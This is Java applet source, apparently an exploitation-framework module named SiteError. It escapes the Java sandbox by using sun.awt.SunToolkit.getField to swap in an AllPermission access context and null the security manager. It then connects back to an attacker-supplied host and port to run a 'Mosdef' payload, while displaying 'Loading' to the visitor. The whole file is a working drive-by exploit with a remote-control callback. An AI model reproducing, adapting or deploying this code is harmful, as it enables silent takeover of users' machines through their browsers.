import java.applet.Applet;
import java.io.PrintStream;
import java.awt.Graphics;
import java.beans.Expression;
import java.beans.Statement;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.*;
import java.security.cert.Certificate;

public class SiteError extends Applet
{
  public static String host = null;
  public static int port = 0;
  public static int mosdef_type = 0;
  public static int mosdef_id = 0;
  
  public void disableSecurity()
    throws Throwable
  {
    Statement localStatement = new Statement(System.class, "setSecurityManager", new Object[1]);
    Permissions localPermissions = new Permissions();
    localPermissions.add(new AllPermission());
    ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
    AccessControlContext localAccessControlContext = new AccessControlContext(new ProtectionDomain[] {
      localProtectionDomain
    });
    SetField(Statement.class, "acc", localStatement, localAccessControlContext);
    localStatement.execute();
  }

  private Class GetClass(String paramString)
    throws Throwable
  {
    Object arrayOfObject[] = new Object[1];
    arrayOfObject[0] = paramString;
    Expression localExpression = new Expression(Class.class, "forName", arrayOfObject);
    localExpression.execute();
    return (Class)localExpression.getValue();
  }

  private void SetField(Class paramClass, String paramString, Object paramObject1, Object paramObject2)
    throws Throwable
  {
    Object arrayOfObject[] = new Object[2];
    arrayOfObject[0] = paramClass;
    arrayOfObject[1] = paramString;
    Expression localExpression = new Expression(GetClass("sun.awt.SunToolkit"), "getField", arrayOfObject);
    localExpression.execute();
    ((Field)localExpression.getValue()).set(paramObject1, paramObject2);
  }

  public void init()
  {
    String s_mosdef_type = null;
    String s_mosdef_id = null;
    String s_port = null;

    host = getParameter("host");
    s_port = getParameter("port");
    s_mosdef_type = getParameter("type");
    s_mosdef_id = getParameter("id");

    if (host == null) {
      host = "127.0.0.1";
    }
    if (s_port == null) {
      s_port = "5555";
    }
    if (s_mosdef_type == null) {
      s_mosdef_type = "15";
    }
    if (s_mosdef_id == null) {
      s_mosdef_id = "0";
    }

    port = Integer.parseInt(s_port);
    mosdef_type = Integer.parseInt(s_mosdef_type);
    mosdef_id = Integer.parseInt(s_mosdef_id);
    try
    {
	  disableSecurity();
	  callBack();
	}
    catch(Throwable localThrowable)
    {
	  localThrowable.printStackTrace();
    }
  }
  
  public void paint(Graphics paramGraphics)
  {
    paramGraphics.drawString("Loading", 50, 25);
  }

  public void callBack() {
    Mosdef mosdef = new Mosdef(host, port, mosdef_type, mosdef_id);
    mosdef.run();
  }
}